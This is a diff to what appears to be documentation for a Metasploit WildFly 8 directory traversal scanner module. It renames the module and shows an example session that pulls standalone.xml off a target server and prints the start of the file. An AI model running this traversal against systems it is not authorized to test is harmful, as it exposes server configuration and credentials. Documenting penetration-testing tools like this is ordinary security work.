@@ -6,18 +6,17 @@ WildFly 8 (JBossAS) Directory Traversal
 
 Output:
 ```
-msf > use auxiliary/scanner/http/wildfly_8_traversal
-msf auxiliary(wildfly_8_traversal) > set RHOSTS 192.168.0.23
+msf > use auxiliary/scanner/http/wildfly_traversal
+msf auxiliary(wildfly_traversal) > set RHOSTS 192.168.0.23
 RHOSTS => 192.168.0.23
-msf auxiliary(wildfly_8_traversal) > run
+msf auxiliary(wildfly_traversal) > run
 
 [*] Attempting to download: standalone\\configuration\\standalone.xml
-[*] Server returns HTTP code: 200
 [*] File saved in:
 /home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf auxiliary(wildfly_8_traversal) > head -10
+msf auxiliary(wildfly_traversal) > head -10
 /home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
 [*] exec: head -10
 /home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
@@ -32,7 +31,7 @@ msf auxiliary(wildfly_8_traversal) > head -10
         <extension module="org.jboss.as.ee"/>
         <extension module="org.jboss.as.ejb3"/>
         <extension module="org.jboss.as.jaxrs"/>
-msf auxiliary(wildfly_8_traversal) >
+msf auxiliary(wildfly_traversal) >
 
 ```
 
